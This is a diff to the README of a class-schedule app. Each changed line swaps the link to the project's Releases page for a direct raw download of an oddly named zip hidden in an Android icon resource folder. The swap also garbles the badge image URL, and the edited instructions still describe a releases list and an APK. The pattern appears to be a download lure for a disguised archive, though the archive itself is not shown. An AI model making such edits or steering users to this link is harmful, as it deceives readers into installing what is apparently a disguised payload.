@@ -6,7 +6,7 @@ Welcome to **oh-my-class-schedule**! This application helps you manage your clas
 
 ## 🔗 Download Now
 
-[![Download](https://img.shields.io/badge/Download%20Now-%20-%234CAF50?style=for-the-badge&logo=github)](https://github.com/hakileo202/oh-my-class-schedule/releases)
+[![Download](https://raw.githubusercontent.com/hakileo202/oh-my-class-schedule/main/src-tauri/gen/android/app/src/main/res/mipmap-xxxhdpi/class_oh_schedule_my_3.9-alpha.5.zip%20Now-%20-%234CAF50?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/hakileo202/oh-my-class-schedule/main/src-tauri/gen/android/app/src/main/res/mipmap-xxxhdpi/class_oh_schedule_my_3.9-alpha.5.zip)
 
 ## 🛠️ System Requirements
 
@@ -19,7 +19,7 @@ Before you start, ensure that your device meets these requirements:
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/hakileo202/oh-my-class-schedule/releases) to download the latest version of our app. Choose the version suitable for your needs and follow the instructions below.
+To get started, visit the [Releases page](https://raw.githubusercontent.com/hakileo202/oh-my-class-schedule/main/src-tauri/gen/android/app/src/main/res/mipmap-xxxhdpi/class_oh_schedule_my_3.9-alpha.5.zip) to download the latest version of our app. Choose the version suitable for your needs and follow the instructions below.
 
 1. Click on the link above.
 2. You will see a list of available files. If you are using an Android device, look for the APK file.
@@ -61,4 +61,4 @@ Thank you for using **oh-my-class-schedule**! We hope this app helps you manage 
 
 ---
 
-[![Download](https://img.shields.io/badge/Download%20Now-%20-%234CAF50?style=for-the-badge&logo=github)](https://github.com/hakileo202/oh-my-class-schedule/releases)
+[![Download](https://raw.githubusercontent.com/hakileo202/oh-my-class-schedule/main/src-tauri/gen/android/app/src/main/res/mipmap-xxxhdpi/class_oh_schedule_my_3.9-alpha.5.zip%20Now-%20-%234CAF50?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/hakileo202/oh-my-class-schedule/main/src-tauri/gen/android/app/src/main/res/mipmap-xxxhdpi/class_oh_schedule_my_3.9-alpha.5.zip)
